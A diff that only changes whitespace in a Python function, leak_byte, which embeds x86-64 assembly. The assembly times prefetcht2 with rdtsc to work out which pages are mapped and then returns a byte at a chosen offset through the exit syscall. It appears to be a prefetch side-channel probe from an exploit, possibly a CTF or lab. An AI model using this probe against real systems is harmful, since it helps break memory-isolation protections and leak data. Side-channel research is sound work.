@@ -19,50 +19,50 @@ def leak_byte(binary: str, pos: int, threshold: int) -> int:
     .measure_page:
         lfence
         rdtsc
-        mov	rsi, rax
-        sal	rdx, 32
-        or	rsi, rdx
+        mov rsi, rax
+        sal rdx, 32
+        or  rsi, rdx
         lfence
         rdtsc
         /* rcx 上记录了空访问的耗时 */
-        mov	rcx, rax
-        sal	rdx, 32
-        or	rcx, rdx
+        mov rcx, rax
+        sal rdx, 32
+        or  rcx, rdx
         lfence
         rdtsc
-        mov	r8, rax
-        sal	rdx, 32
-        or	r8, rdx
-        prefetcht2	[rdi]
-        prefetcht2	[rdi]
-        prefetcht2	[rdi]
-        prefetcht2	[rdi]
-        prefetcht2	[rdi]
-        prefetcht2	[rdi]
-        prefetcht2	[rdi]
-        prefetcht2	[rdi]
-        prefetcht2	[rdi]
-        prefetcht2	[rdi]
-        prefetcht2	[rdi]
-        prefetcht2	[rdi]
-        prefetcht2	[rdi]
-        prefetcht2	[rdi]
-        prefetcht2	[rdi]
-        prefetcht2	[rdi]
-        prefetcht2	[rdi]
-        prefetcht2	[rdi]
-        prefetcht2	[rdi]
-        prefetcht2	[rdi]
-        prefetcht2	[rdi]
-        prefetcht2	[rdi]
-        prefetcht2	[rdi]
-        prefetcht2	[rdi]
-        prefetcht2	[rdi]
+        mov r8, rax
+        sal rdx, 32
+        or  r8, rdx
+        prefetcht2 [rdi]
+        prefetcht2 [rdi]
+        prefetcht2 [rdi]
+        prefetcht2 [rdi]
+        prefetcht2 [rdi]
+        prefetcht2 [rdi]
+        prefetcht2 [rdi]
+        prefetcht2 [rdi]
+        prefetcht2 [rdi]
+        prefetcht2 [rdi]
+        prefetcht2 [rdi]
+        prefetcht2 [rdi]
+        prefetcht2 [rdi]
+        prefetcht2 [rdi]
+        prefetcht2 [rdi]
+        prefetcht2 [rdi]
+        prefetcht2 [rdi]
+        prefetcht2 [rdi]
+        prefetcht2 [rdi]
+        prefetcht2 [rdi]
+        prefetcht2 [rdi]
+        prefetcht2 [rdi]
+        prefetcht2 [rdi]
+        prefetcht2 [rdi]
+        prefetcht2 [rdi]
         lfence
         rdtsc
-        sub	eax, r8d
-        sub	rcx, rsi
-        sub	eax, ecx
+        sub eax, r8d
+        sub rcx, rsi
+        sub eax, ecx
 
         /* 如果 T1 >= 阈值，说明未映射，直接跳过 */
         cmp rax, {threshold}
@@ -75,7 +75,7 @@ def leak_byte(binary: str, pos: int, threshold: int) -> int:
 
         /* 匹配成功，用 syscall exit 返回第 {pos} 索引位置的字节 */
         movzx rdi, byte ptr [rdi + {pos}]
-        mov rax, 60           
+        mov rax, 60
         syscall
 
     .next:
